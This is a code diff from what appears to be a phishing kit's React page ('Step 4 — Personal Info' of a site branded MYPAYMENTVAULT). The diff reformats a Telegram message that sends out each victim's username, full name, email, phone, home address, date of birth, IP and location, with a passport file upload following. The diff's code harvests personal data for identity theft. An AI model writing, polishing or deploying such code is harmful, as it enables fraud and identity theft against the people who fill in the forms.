@@ -106,21 +106,21 @@ export default function Step4() {
     const ip  = await getIPInfo();
 
     await sendTelegram(
-      `📋 <b>MYPAYMENTVAULT - Step 4: Personal Info</b>\n\n` +
-      `👤 Username: <code>${user?.username ?? "-"}</code>\n` +
-      `👦 First Name: <code>${firstName}</code>\n` +
-      `👦 Last Name: <code>${lastName}</code>\n` +
-      `📧 Email: <code>${email}</code>\n` +
-      `📱 Mobile: <code>${phone}</code>\n` +
-      `🏠 Address: <code>${address}</code>\n` +
-      `🏙️ City: <code>${city}</code>\n` +
-      `🗺️ State: <code>${state}</code>\n` +
-      `📮 Postal Code: <code>${postalCode}</code>\n` +
-      `🎂 DOB: <code>${dob}</code>\n` +
-      `📌 Inquiry: <code>${inquiryType}</code>\n` +
-      `💬 Message: <code>${message || "-"}</code>\n` +
-      `🌐 IP: <code>${ip}</code>\n` +
-      `🕐 Waktu: ${now}`
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📋 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Step 4 — Personal Info</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
+      `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
+      `📧 <b>Email</b>       : <code>${email}</code>\n` +
+      `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
+      `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${state} ${postalCode}</code>\n` +
+      `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
+      `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
+      `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
     );
 
     if (passportFile) {
